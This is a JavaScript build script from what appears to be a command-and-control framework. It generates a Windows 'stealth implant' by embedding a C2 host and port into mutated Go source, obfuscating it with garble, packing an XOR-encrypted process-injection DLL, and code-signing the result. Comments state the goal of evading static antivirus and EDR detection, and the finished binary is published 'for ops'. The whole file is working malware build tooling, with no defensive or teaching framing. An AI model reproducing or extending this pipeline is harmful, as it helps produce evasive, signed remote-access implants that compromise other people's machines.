/**
 * Windows stealth implant — single signed EXE, garble required, embedded migrate DLL only.
 * Same runtime behaviour as lastfinalversion2.go; build pipeline hardened for static/EDR noise.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { signPeFile } = require('./signing');
const {
  SOURCE,
  ROOT,
  BUILDS_DIR,
  randomId,
  randomKey,
  randomDllDropPrefix,
  mutateSource,
  verifyEmbeddedC2,
  writeEncryptedEmbeddedDll,
  findMingwBin,
  defaultStealthOutputBase,
  randomWindowsSensitive,
  run,
  which,
  readManifest,
  writeManifest,
  normalizeImplantHost,
} = require('./polymorph');

/** Stable folder for “grab the EXE here” — also under each build id in builds/<id>/ */
const WORKING_DIR = path.join(BUILDS_DIR, 'working');

function copyExeViaTemp(src, dest) {
  const tmp = `${dest}.${process.pid}.tmp`;
  fs.copyFileSync(src, tmp);
  try {
    fs.renameSync(tmp, dest);
  } catch (e) {
    try {
      fs.unlinkSync(dest);
    } catch (_) {
      /* ignore */
    }
    try {
      fs.renameSync(tmp, dest);
    } catch (e2) {
      try {
        fs.unlinkSync(tmp);
      } catch (_) {
        /* ignore */
      }
      throw e2;
    }
  }
}

function publishStealthExe(outPath, outName) {
  fs.mkdirSync(WORKING_DIR, { recursive: true });
  const named = path.join(WORKING_DIR, outName);
  const latest = path.join(WORKING_DIR, 'latest-stealth.exe');
  const copyOne = (dest) => {
    try {
      copyExeViaTemp(outPath, dest);
    } catch (e) {
      if (e.code === 'EBUSY' || e.code === 'EPERM') {
        const buf = fs.readFileSync(outPath);
        const tmp = `${dest}.${process.pid}.tmp`;
        fs.writeFileSync(tmp, buf);
        fs.renameSync(tmp, dest);
      } else {
        throw e;
      }
    }
  };
  copyOne(named);
  let latestStealthExe = latest;
  try {
    copyOne(latest);
  } catch (e) {
    if (e.code === 'EBUSY' || e.code === 'EPERM') {
      console.warn(
        '[STEALTH] Could not update latest-stealth.exe (file in use). Use:',
        named
      );
      latestStealthExe = named;
    } else {
      throw e;
    }
  }
  const metaPath = path.join(WORKING_DIR, 'latest-meta.json');
  return { workingDir: WORKING_DIR, workingExe: named, latestStealthExe, workingMetaPath: metaPath };
}

async function ensureGarbleOnPath() {
  let garblePath = await which('garble');
  if (garblePath) return garblePath;
  if (process.env.BUILD_ALLOW_PLAIN === '1' || process.env.BUILD_ALLOW_PLAIN === 'true') {
    return null;
  }
  const garbleVersions = ['v0.16.0', 'v0.15.1', 'v0.14.2', 'latest'];
  let installed = false;
  for (const ver of garbleVersions) {
    console.log(`[STEALTH] garble not on PATH — trying mvdan.cc/garble@${ver} ...`);
    try {
      await run('go', ['install', `mvdan.cc/garble@${ver}`], {
        env: { ...process.env, GO111MODULE: 'on' },
      });
      installed = true;
      break;
    } catch (e) {
      console.warn(`[STEALTH] garble@${ver} install failed: ${e.message}`);
    }
  }
  if (!installed) {
    throw new Error(
      'garble is required for Windows stealth builds. On the teamserver: go install mvdan.cc/garble@v0.14.2 and add $(go env GOPATH)/bin to PATH'
    );
  }
  garblePath = await which('garble');
  if (!garblePath) {
    throw new Error('garble install finished but garble not found on PATH — add $(go env GOPATH)/bin to PATH');
  }
  return garblePath;
}

function scrubWorkDirArtifacts(workDir, keepExeName) {
  try {
    for (const name of fs.readdirSync(workDir)) {
      const p = path.join(workDir, name);
      if (name === keepExeName || name === 'meta.json') continue;
      const st = fs.statSync(p);
      if (st.isDirectory()) {
        fs.rmSync(p, { recursive: true, force: true });
      } else {
        fs.unlinkSync(p);
      }
    }
  } catch (e) {
    console.warn('[STEALTH] Workdir scrub:', e.message);
  }
}

async function generateWindowsStealthImplant(options = {}) {
  const arch = String(options.arch || 'amd64').toLowerCase();
  const host = normalizeImplantHost(options.host || process.env.BUILD_C2_HOST || '');
  const port = Number(options.port || process.env.BUILD_C2_PORT || process.env.TCP_PORT || 2026);

  if (!host) {
    throw new Error('C2 host is required');
  }
  if (host === '127.0.0.1' && process.env.APP_ENV === 'production') {
    throw new Error('Refusing 127.0.0.1 in production — set BUILD_C2_HOST');
  }
  if (!port || port < 1 || port > 65535) throw new Error('invalid port');

  const signOpts = {
    enabled: options.signCode !== false,
    subject: options.signSubject ? String(options.signSubject).trim() : undefined,
    autoLab: options.signAuto !== false,
  };

  if (!fs.existsSync(SOURCE)) {
    throw new Error('lastfinalversion2.go not found');
  }

  const garblePath = await ensureGarbleOnPath();
  if (!garblePath && process.env.BUILD_ALLOW_PLAIN !== '1') {
    throw new Error('Windows stealth build requires garble on the teamserver');
  }

  const id = randomId();
  const xorKey = randomKey(18 + (crypto.randomBytes(1)[0] % 10));
  const shiftValue = 3 + (crypto.randomBytes(1)[0] % 23);
  const stamp = crypto.randomBytes(32).toString('hex');
  const buildid = crypto.randomBytes(20).toString('hex');
  const dllDropPrefix = randomDllDropPrefix();
  const sensitivePlain = randomWindowsSensitive(dllDropPrefix);

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const raw = fs.readFileSync(SOURCE, 'utf8');
  const mutated = mutateSource(raw, {
    xorKey,
    shiftValue,
    host,
    port,
    stamp,
    platform: 'windows',
    buildid,
    dllDropPrefix,
    sensitivePlain,
    stealthAppNames: true,
  });
  verifyEmbeddedC2(mutated, xorKey, host, port);
  fs.writeFileSync(path.join(workDir, 'main.go'), mutated, 'utf8');
  console.log(`[STEALTH] Verified C2 embed ${host}:${port}`);

  const platformFiles = [
    ['lastfinalversion2_platform_windows.go', 'platform_windows.go'],
    ['lastfinalversion2_platform_other.go', 'platform_other.go'],
  ];
  for (const [fromName, toName] of platformFiles) {
    const fromRoot = path.join(ROOT, fromName);
    const fromBuilder = path.join(__dirname, toName);
    const src = fs.existsSync(fromRoot) ? fromRoot : fromBuilder;
    if (!fs.existsSync(src)) throw new Error(`missing ${fromName}`);
    fs.copyFileSync(src, path.join(workDir, toName));
  }

  fs.writeFileSync(
    path.join(workDir, 'dll_cgo.go'),
    `//go:build dll\n\npackage main\n\nimport "C"\n`,
    'utf8'
  );
  fs.writeFileSync(
    path.join(workDir, 'go.mod'),
    `module stealth_${id.replace(/[^a-z0-9]/gi, '')}\n\ngo 1.21\n`,
    'utf8'
  );

  fs.writeFileSync(
    path.join(workDir, 'embedded_dll.go'),
    `package main\n\nfunc embeddedInjectDLLBytes() []byte { return nil }\n`,
    'utf8'
  );

  let injectDllPacked = false;
  const mingwBin = findMingwBin();

  if (mingwBin) {
    const dllName = 'inject_payload.dll';
    const dllPath = path.join(workDir, dllName);
    const cc = arch === '386' ? 'i686-w64-mingw32-gcc' : 'x86_64-w64-mingw32-gcc';
    const dllEnv = {
      ...process.env,
      PATH: `${mingwBin};${process.env.PATH || ''}`,
      GOOS: 'windows',
      GOARCH: arch,
      CGO_ENABLED: '1',
      CC: cc,
    };
    const dllLdflags = `-s -w -X main.BuildMode=dll -buildid=${buildid}dll`;
    try {
      await run(
        'go',
        ['build', '-tags', 'dll', '-buildmode=c-shared', '-trimpath', `-ldflags=${dllLdflags}`, '-o', dllPath, '.'],
        { cwd: workDir, env: dllEnv }
      );
      if (fs.existsSync(dllPath) && fs.statSync(dllPath).size > 1000) {
        injectDllPacked = true;
        writeEncryptedEmbeddedDll(workDir, dllPath, stamp);
        console.log('[STEALTH] Migrate DLL XOR-embedded in EXE (no separate download)');
      }
    } catch (e) {
      console.warn('[STEALTH] Embedded migrate DLL unavailable:', e.message);
    }
  } else {
    console.warn('[STEALTH] MinGW not found — build continues without migrate pack');
  }

  const baseName = (options.outputName || defaultStealthOutputBase()).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = /\.exe$/i.test(baseName) ? baseName : `${baseName}.exe`;
  const outPath = path.join(workDir, outName);

  const ldflags = `-s -w -H=windowsgui -X main.BuildMode=exe -X main.PolyBuildId=${buildid} -buildid=${buildid}`;
  const buildEnv = {
    ...process.env,
    GOOS: 'windows',
    GOARCH: arch,
    CGO_ENABLED: '0',
    GOCACHE: path.join(workDir, '.gocache'),
  };

  let tool = 'garble';
  const garbleSeed = crypto.randomBytes(8).toString('hex');
  const args = garblePath
    ? ['-literals', '-tiny', `-seed=${garbleSeed}`, 'build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.']
  : ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'];

  let toolLabel = 'garble-stealth';
  try {
    await run(garblePath || 'go', args, { cwd: workDir, env: buildEnv });
  } catch (e) {
    const msg = String(e.message || e);
    if (garblePath && /too old|upgrade to go/i.test(msg)) {
      console.warn('[STEALTH] garble/Go mismatch — falling back to obfuscated go build (install go 1.27+ or garble@v0.16.0)');
      await run(
        'go',
        ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'],
        { cwd: workDir, env: buildEnv }
      );
      toolLabel = 'go-stealth-obf';
    } else {
      throw new Error(`Stealth compile failed: ${msg}`);
    }
  }

  if (!fs.existsSync(outPath)) {
    throw new Error('Stealth build finished but EXE missing');
  }

  // No post-build PE overlay — breaks Authenticode and triggers static AV on modified PE.
  let signResult = { signed: false };
  signResult = await signPeFile(outPath, signOpts);

  scrubWorkDirArtifacts(workDir, outName);

  const stat = fs.statSync(outPath);
  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');

  const meta = {
    id,
    platform: 'windows',
    arch,
    variant: 'stealth',
    host,
    port,
    fileName: outName,
    size: stat.size,
    sha256,
    xorKeyLen: xorKey.length,
    shiftValue,
    stamp: stamp.slice(0, 16),
    tool: toolLabel,
    format: 'exe',
    singleArtifact: true,
    injectDllPacked,
    stealthBuild: true,
    authenticodeSigned: !!signResult.signed,
    signPublisher: signResult.publisher,
    signNote: signResult.signed ? undefined : signResult.reason || undefined,
    createdAt: new Date().toISOString(),
  };
  const workPaths = publishStealthExe(outPath, outName);
  Object.assign(meta, workPaths);

  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
  fs.writeFileSync(
    workPaths.workingMetaPath,
    JSON.stringify(
      {
        id: meta.id,
        fileName: outName,
        host,
        port,
        sha256,
        workingExe: workPaths.workingExe,
        latestStealthExe: workPaths.latestStealthExe,
        createdAt: meta.createdAt,
      },
      null,
      2
    )
  );

  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));

  console.log(`[STEALTH] Ready ${outName} (${stat.size} bytes) sha256=${sha256.slice(0, 12)}…`);
  console.log(`[STEALTH] Copy for ops: ${workPaths.latestStealthExe}`);
  return meta;
}

module.exports = { generateWindowsStealthImplant, ensureGarbleOnPath };
